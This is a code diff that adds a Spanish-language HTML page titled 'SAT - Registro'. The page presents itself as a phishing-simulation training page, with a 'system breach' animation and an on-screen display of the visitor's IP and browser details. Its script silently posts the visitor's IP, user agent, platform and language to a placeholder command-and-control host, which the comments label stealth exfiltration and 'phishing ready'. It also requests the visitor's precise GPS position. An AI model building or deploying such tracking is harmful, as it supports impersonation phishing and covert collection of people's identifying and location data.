@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SAT - Registro</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+background:black;
+color:#00ff00;
+font-family:Consolas,monospace;
+overflow:hidden;
+}
+
+/* -------- INTRO FULLSCREEN -------- */
+#intro{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100vh;
+background:black;
+z-index:9999;
+display:flex;
+justify-content:center;
+align-items:center;
+flex-direction:column;
+overflow:hidden;
+}
+
+#matrixCanvas{
+position:absolute;
+top:0;
+left:0;
+width:100%;
+height:100%;
+z-index:1;
+}
+
+#flash{
+position:absolute;
+width:100%;
+height:100%;
+background:white;
+opacity:0;
+z-index:3;
+}
+
+#giantSkull{
+font-size:220px;
+z-index:2;
+animation: glitch 1s infinite;
+}
+
+/* Glitch animation */
+@keyframes glitch{
+0%{transform:translate(0)}
+20%{transform:translate(-5px,5px)}
+40%{transform:translate(-5px,-5px)}
+60%{transform:translate(5px,5px)}
+80%{transform:translate(5px,-5px)}
+100%{transform:translate(0)}
+}
+
+#breachText{
+position:absolute;
+bottom:20%;
+font-size:28px;
+color:red;
+letter-spacing:4px;
+animation: flicker 0.1s infinite;
+z-index:2;
+}
+
+@keyframes flicker{
+0%{opacity:1}
+50%{opacity:0.2}
+100%{opacity:1}
+}
+
+/* -------- CONTENIDO FINAL -------- */
+#mainContent{
+display:none;
+min-height:100vh;
+background:#0b0f0c;
+padding:50px;
+opacity:0;
+transition:opacity 2s ease;
+}
+
+.alert-box{
+max-width:900px;
+margin:auto;
+background:#111;
+padding:40px;
+border:1px solid #00ff00;
+border-radius:8px;
+box-shadow:0 0 20px #00ff00;
+}
+
+h1{
+color:#00ff00;
+margin-bottom:20px;
+font-size:32px;
+}
+
+.info-row{
+display:flex;
+justify-content:space-between;
+margin:12px 0;
+}
+
+button{
+margin-top:20px;
+padding:12px 25px;
+background:#00aa00;
+border:none;
+color:white;
+cursor:pointer;
+border-radius:4px;
+transition:0.3s;
+}
+
+button:hover{
+background:#00ff00;
+box-shadow:0 0 10px #00ff00;
+}
+</style>
+</head>
+
+<body>
+
+<div id="intro">
+<canvas id="matrixCanvas"></canvas>
+<div id="flash"></div>
+<div id="giantSkull">💀</div>
+<div id="breachText">SYSTEM BREACH DETECTED</div>
+</div>
+
+<div id="mainContent">
+<div class="alert-box">
+<h1>¡DATOS COMPROMETIDOS!</h1>
+
+<div class="info-row">
+<span>IP Detectada:</span>
+<span id="userIP">Obteniendo...</span>
+</div>
+
+<div class="info-row">
+<span>Navegador:</span>
+<span id="userAgent"></span>
+</div>
+
+<div class="info-row">
+<span>Dispositivo:</span>
+<span id="deviceInfo"></span>
+</div>
+
+<p style="margin-top:25px;">
+🚨 SIMULACIÓN DE PHISHING - ENTRENAMIENTO DE SEGURIDAD
+</p>
+
+<p><strong>Tu información fue "capturada" en esta simulación controlada.</strong></p>
+
+<button onclick="reportSuccess()">✓ Reporté el phishing</button>
+</div>
+</div>
+
+<script>
+/* -------- MATRIX EFFECT -------- */
+const canvas=document.getElementById("matrixCanvas");
+const ctx=canvas.getContext("2d");
+
+canvas.width=window.innerWidth;
+canvas.height=window.innerHeight;
+
+const letters="01ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&";
+const fontSize=14;
+const columns=canvas.width/fontSize;
+const drops=[];
+
+for(let i=0;i<columns;i++){drops[i]=1;}
+
+function draw(){
+ctx.fillStyle="rgba(0,0,0,0.08)";
+ctx.fillRect(0,0,canvas.width,canvas.height);
+ctx.fillStyle="#0F0";
+ctx.font=fontSize+"px monospace";
+
+for(let i=0;i<drops.length;i++){
+const text=letters[Math.floor(Math.random()*letters.length)];
+ctx.fillText(text,i*fontSize,drops[i]*fontSize);
+if(drops[i]*fontSize>canvas.height && Math.random()>0.975)
+drops[i]=0;
+drops[i]++;
+}
+}
+setInterval(draw,30);
+
+/* -------- FLASH EFFECT -------- */
+setTimeout(()=>{
+document.getElementById("flash").style.opacity="0.8";
+setTimeout(()=>{
+document.getElementById("flash").style.opacity="0";
+},200);
+},3000);
+
+/* -------- TRANSICIÓN -------- */
+setTimeout(()=>{
+document.getElementById("intro").style.transition="opacity 2s";
+document.getElementById("intro").style.opacity="0";
+setTimeout(()=>{
+document.getElementById("intro").style.display="none";
+document.body.style.overflow="auto";
+document.getElementById("mainContent").style.display="block";
+setTimeout(()=>{
+document.getElementById("mainContent").style.opacity="1";
+},100);
+},2000);
+},4500);
+
+/* -------- INFO SISTEMA -------- */
+// 🔍 IP + Device Detection Mejorado (SAT Phishing Ready)
+// Usa ipify.org (gratuito, no CORS issues) + fallback
+
+document.getElementById("userAgent").innerText = navigator.userAgent;
+document.getElementById("deviceInfo").innerText = navigator.platform;
+
+// 🔥 IP Detection Async (No bloquea UI)
+document.getElementById("userIP").innerText = "Detectando IP...";
+
+async function fetchUserIP() {
+    try {
+        // ipify.org → JSON limpio, works everywhere
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        
+        // Muestra IP + país (bonus)
+        document.getElementById("userIP").innerText = data.ip;
+        
+        // 🚨 EXFIL AUTO (Stealth) → Tu C2
+        await fetch('https://tu-phishing-c2.com/log', {
+            method: 'POST',
+            mode: 'no-cors',  // Bypass CORS
+            body: JSON.stringify({
+                ip: data.ip,
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timestamp: new Date().toISOString()
+            })
+        });
+        
+        console.log('✅ IP capturada:', data.ip);  // Debug
+    } catch (error) {
+        // Fallback: otros APIs
+        fetch('https://api.ipgeolocation.io/ipgeo?apiKey=free')  // Free tier
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById("userIP").innerText = data.ip_address || 'IP oculta';
+            })
+            .catch(() => {
+                document.getElementById("userIP").innerText = 'IP no detectable';
+            });
+    }
+}
+
+// Ejecuta al load
+fetchUserIP();
+
+// 🎁 BONUS: Geolocation (GPS preciso)
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            const coords = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`;
+            // Crea elemento oculto o exfil
+            console.log('📍 GPS:', coords);
+            // document.getElementById("gps").innerText = coords;  // Si tienes campo
+        },
+        () => console.log('GPS bloqueado')
+    );
+}
+
+function reportSuccess(){
+alert("Gracias por reportar el phishing.");
+}
+</script>
+
+</body>
+</html>
